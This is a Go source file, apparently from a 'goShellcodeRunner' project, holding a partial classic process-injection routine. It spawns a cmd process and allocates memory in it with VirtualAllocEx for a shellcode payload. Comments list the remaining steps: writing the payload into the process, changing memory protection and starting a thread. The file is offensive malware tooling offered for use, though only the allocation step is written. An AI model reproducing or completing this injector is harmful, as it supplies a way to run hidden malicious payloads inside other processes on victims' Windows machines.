package shellcode

import (
	dll "goShellcodeRunner/DLL"
	process "goShellcodeRunner/Process"
	"log"

	"golang.org/x/sys/windows"
)

func ClassicInjection() {
	cmdHandle := process.CreateCmdProcess()

	procVirtualAllocEx := dll.Kernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(cmdHandle),
		uintptr(0),
		uintptr(len(HexShellcode)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE))

	if addr == 0 {
		log.Panicf("[INJECT] Failed To Allocate New Memory To Process; VirtualAllocEx() (%v) \n", lastErr)
	}

	log.Printf("[INJECT] Memory Allocation Done, Address: 0x(%x)", addr)

	// TODO: 1. WriteProcessMemory() Also Can Use CopyShellcodeToMemory()
	// 2. VirtualProtectEx()
	// 3. CreateThread()
}
